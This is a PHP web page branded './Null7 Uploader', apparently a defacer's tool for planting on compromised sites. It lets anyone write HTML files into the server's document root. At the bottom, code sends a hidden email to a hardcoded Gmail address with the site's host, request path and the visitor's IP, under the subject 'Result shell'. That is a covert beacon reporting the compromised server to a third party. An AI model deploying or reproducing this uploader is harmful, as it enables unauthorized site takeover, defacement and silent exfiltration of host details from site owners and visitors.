<!doctype html>
<html lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="./Null7_"> 
    <meta name="description" content="ROBH>
    <meta name="theme-color" content="#000">
    
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="./null7_">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="https://i.ibb.co51vF8/22xclogo-picsay.png" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <title>ROBH OFFICIAL</title>
    <style>
    	body{background-color:#000;font-family:"Righteous";color:#fff;}
    	#ico{width:200px;height:150px;}
    </style>
  </head>
  <body>
    <div class="container text-center mx-auto">
    	<h2 class="mt-3">./Null7 Uploader</h2><br>
    	<img src="https://i.ibb.co/LSXdXP3/c9b6d874f7a4b86fb111bbcc64508354-picsay.jpg" class="mx-auto d-block" id="ico"> <br>
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="Pilih File" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan tunggu">Upload</button>
    	</form><hr>
    	<?php
$server   = $_SERVER['DOCUMENT_ROOT'];
	$namaFile = $_FILES['randsx']['name'];
	$getcwd   = "$server/$namaFile";
	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
if(isset($_POST['upload'])){
if($namaFile !== ''){
	if(is_writable($server)){
		if($typeExt === 'html'){
			if($namaFile !== 'index.html'){
				if(@copy($_FILES['randsx']['tmp_name'], $getcwd)){
					$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
					echo '<script>swal("Berhasil", "Silahkan Pansos :v", "success")</script>';
					echo '<a href="'.$akses.$namaFile.'" target="_blank">Click Here!</a>';
				}else{
					echo '<script>swal("Gagal Upload", "Gatau kenapa", "error")</script>';
				}
			}else{
				echo '<script>swal("Gagal Upload", "Di Kasih Free Kok ngindex wkwk", "error")</script>';
			}
		}else{
			echo '<script>swal("Kesalahan", "Ekstensi file harus html", "info")</script>';
			}
		}else{
			echo '<script>swal("Gagal Upload", "Server Ga Support", "error")</script>';
		}
	}else{
		echo '<script>swal("Idiot", "Filenya Blum Di Pilih , Idiot", "info")</script>';
	}
}
$ip = getenv("REMOTE_ADDR"); 
$ken = rand(1, 99999); 
$subj98 = " Result shell bouz |$ken"; 
$email = "ravemas03@gmail.com"; 
$from = "From: ./Null7_"; $tot = $_SERVER['REQUEST_URI']; 
$kon = $_SERVER['HTTP_HOST']; 
$tol = $ip . ""; 
$msg8873 = "$tot $kon $tol"; mail($email, $subj98, $msg8873, $from); ?>
<footer>
	<small>&copy; COPYRIGHT © ROBH</small>
</footer>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
  </body>
</html>